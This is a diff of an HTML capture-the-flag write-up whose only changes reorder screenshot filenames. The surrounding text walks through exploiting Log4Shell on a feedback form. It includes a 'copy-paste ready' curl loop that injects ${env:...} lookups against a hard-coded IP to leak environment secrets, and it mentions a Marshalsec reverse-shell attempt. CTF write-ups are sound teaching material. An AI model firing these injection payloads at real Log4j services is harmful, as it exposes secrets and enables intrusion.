@@ -210,7 +210,7 @@
     <p>Intercepted the POST request with ZAP and saw our feedback being logged directly on the server response:</p>
     <img src="Pic/FeedbackFallout/3.png" alt="ZAP intercept">
     <p>So I started googling about Logs exploit, and then I remembered, <code>"Logs four"</code> at the bottom of the feedback page, which could lead to something.</p>
-    <img src="Pic/FeedbackFallout/4.png" alt="Challenge hint!">
+    <img src="Pic/FeedbackFallout/6.png" alt="Challenge hint!">
     <p>I came across an old Java vulnerability, <code>Log4Shell (CVE-2021-44228)</code></p>
     <p>I Tried to get a reverse shell using <code>Marshalsec</code></p>
     <pre><code>
@@ -226,7 +226,7 @@
     <p>So, I tried a Basic syntax</p>
     <pre><code>${java:version}</code></pre>
 
-    <img src="Pic/FeedbackFallout/5.png" alt="Java version leaked">
+    <img src="Pic/FeedbackFallout/4.png" alt="Java version leaked">
 
     <p>So, Since <code>JNDI</code> Is disabled, AND the java still leaks info, What if i just bruteforce <code>${env:KEY}</code></p>
 
@@ -249,7 +249,7 @@
     -d "feedback=${env:$i}" | grep -o "User .*"
 done</code></pre>
 
-    <img src="Pic/FeedbackFallout/6.png" alt="Flag found">
+    <img src="Pic/FeedbackFallout/5.png" alt="Flag found">
 
     <p>One-liner version (copy-paste ready):</p>
     <pre><code>for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying ${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=${env:$i}" | grep -o "User .*"; done</code></pre>
